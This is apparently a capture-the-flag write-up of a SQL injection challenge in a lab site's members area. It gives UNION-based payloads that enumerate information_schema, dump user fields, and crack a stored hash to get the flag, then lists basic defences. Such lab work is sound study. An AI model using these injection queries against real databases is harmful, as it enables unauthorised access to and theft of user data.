# SQL Injection in Members Area

### Tools
SQL injections list from:https://github.com/payloadbox/sql-injection-payload-list

SQL UNION ATACK guide: https://charlesreid1.com/wiki/SQL_Injection/UNION_Attack
Since we are not allowed to use automated tools like sqlmap.

### How to solve it

1. Firt run multiple sql injetion untill something happens using : 
```
 1 UNION SELECT NULL,NULL
```
2. Later on we try multiple commands and we findout some stuff, member 5 has a Flag inside it, but we couldn't found any password or user info .
```
 5 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```
3. With this command we get a list with all schemas and tables and their columns searching for some words we found a schema with all users data like first_name, town and countersign .
```
 5 union select table_name, table_schema from information_schema.columns 
 5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns-- 
```
4. Now we try to access users table to get users info and we get this  Decrypt this password -> then lower all the char. Sh256 on it and it's good !: 5ff9d0165b4f92b14994e5c685cdce28 cracking it we get :		FortyTwo. and lowering it to fortytwo and using Sh256 we get 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```
 5 union SELECT town, countersign FROM Member_Sql_Injection.users
```
### How to protect
 - use ORM system
 - Input Validation like restricting input size, and if the data is a name it doesnt have to contain numbers  and if the data is a number we could block string from it.
 - Sanitize user input by checking some chars in the input and exchanging it so the SQL doesn't interpeter these.
